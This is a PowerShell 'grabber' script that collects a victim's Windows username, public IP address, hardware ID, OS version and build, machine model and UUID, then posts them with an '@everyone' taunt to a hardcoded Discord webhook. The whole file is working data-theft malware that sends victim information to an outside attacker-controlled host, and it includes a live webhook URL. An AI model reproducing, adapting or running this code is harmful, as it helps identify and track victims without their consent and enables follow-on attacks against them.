# this will get updates, like mac and ram checks and things
$webHookUrl = "https://discord.com/api/webhooks/1190874512523264141/2bxvhih9SqmYXru6m4-ByaMlW5xP-pK-D01kx2PGEto7PZQ2ip8jLlbwJk19iLL4hSlK"
[System.Collections.ArrayList]$embedArray = @()
$color = '4289797'
$title = 'PS1 Grabber @everyone'
$pc_username = $env:USERNAME
$pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
$pc_ip = $pc_ip.Content
$pc_hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
$osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
$osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
$model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
$uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
$description = "
@everyone
 gg to lil bro
pcusername: $pc_username
pc_ip:  $pc_ip
pc_hwid: $pc_hwid
os_version: $osversion
os_build: $osbuild
model: $model
uuid = $uuid
"

$embedObject = [PSCustomObject]@{
    color = $color
    title = $title
    description = $description
}
$embedArray.Add($embedObject)
$payload = [PSCustomObject]@{
    embeds = $embedArray
}

Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
